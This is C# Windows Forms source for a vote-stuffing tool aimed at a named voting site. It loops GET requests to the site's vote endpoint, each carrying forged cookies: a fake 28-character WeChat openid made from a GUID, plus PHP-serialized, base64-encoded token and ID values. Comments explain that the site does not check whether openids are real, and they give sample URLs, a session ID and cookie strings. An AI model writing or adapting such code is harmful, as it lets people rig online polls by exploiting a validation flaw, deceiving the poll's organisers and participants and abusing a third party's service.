using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Web;
using System.Windows.Forms;

namespace Vote
{
    public partial class Form1 : Form
    {
        delegate void SetTextCallback(string text);
        Thread thread;
        public Form1()
        {
            InitializeComponent();
        }

        private void btnVote_Click(object sender, EventArgs e)
        {
            txtLog.Text = "";
            thread = new Thread(new ThreadStart(this.Process));
            thread.Start();

        }

        private void Process()
        {
            //url is something like below
            //http://1048762540.tt.ylwlb.com/Home/index.php?m=Index&a=vote&vid=94780&id=317017338&tp=
            string url = string.Format(txtUrl.Text, txtCandidateId.Text, txtVoteId.Text);


            //Construct cookie, cookie should be something like below:
            //oauth_openid=oKbwrwMtugrsV_4CMWIYQnW15EPs; PHPSESSID=5a94217019e4e940e2c9c44e42299af3; token_317017338=czoxNToiZ2hfNTg4YTQ0MDYxYjEwIjs%3D; wecha_id_317017338=czoyODoiOTU2MmQyOTgtZjYyOS00MWI0LWEzYjItZTQ4NiI7

            string cookieTemplate = "oauth_openid={0}; PHPSESSID={1}; token_{2}={3}; wecha_id_{4}={5}";

            string base64Token = GenerateBase64Token(txtToken.Text);

            string encodedBase64Token = HttpUtility.UrlEncode(base64Token);

            int count = Convert.ToInt32(txtNumber.Text);
            for (int i = 0; i < count; i++)
            {
                string openId = GenerateFakeOpenId();

                string base64OpenId = GenerateBase64OpenId(openId);

                string cookies = string.Format(cookieTemplate, openId, txtSessionId.Text, txtVoteId.Text, encodedBase64Token, txtVoteId.Text, base64OpenId);

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                request.Method = "GET";
                request.Headers.Add("Cookie", cookies);

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();
                using (StreamReader reader = new StreamReader(response.GetResponseStream()))
                {
                    string jsonString = reader.ReadToEnd();

                }
                this.SetText((i+1).ToString() + "\n");
            }
        }

        private void SetText(string text)
        {
            if (this.txtLog.InvokeRequired)
            {
                SetTextCallback d = new SetTextCallback(SetText);
                this.Invoke(d, new object[] { text });
            }
            else
            {
                this.txtLog.AppendText(text);
                this.txtLog.Refresh();
            }
        }




        private string GenerateFakeOpenId()
        {
            //http://www.tt.ylwlb.com/ doesn't check if the openid is real or not
            //it only treat 28 characters long string as the openid
            //so I will only generate a random string with 28 characters
            string guid = (Guid.NewGuid()).ToString();
            return guid.Substring(0, 28);
        }

        private string GenerateBase64Token(string token)
        {
            //token_317017338=czoxNToiZ2hfNTg4YTQ0MDYxYjEwIjs%3D
            string tokenTemplate = "s:15:\"{0}\";";
            string tokenString = String.Format(tokenTemplate, token);
            byte[] b = System.Text.Encoding.Default.GetBytes(tokenString);
            return Convert.ToBase64String(b);
        }

        private string GenerateBase64OpenId(string openid)
        {
            //wecha_id_317017338=czoyODoiOTU2MmQyOTgtZjYyOS00MWI0LWEzYjItZTQ4NiI7
            string openIdTemplate = "s:28:\"{0}\";";
            string openIdString = String.Format(openIdTemplate, openid);
            byte[] b = System.Text.Encoding.Default.GetBytes(openIdString);
            return Convert.ToBase64String(b);
        }


    }
}
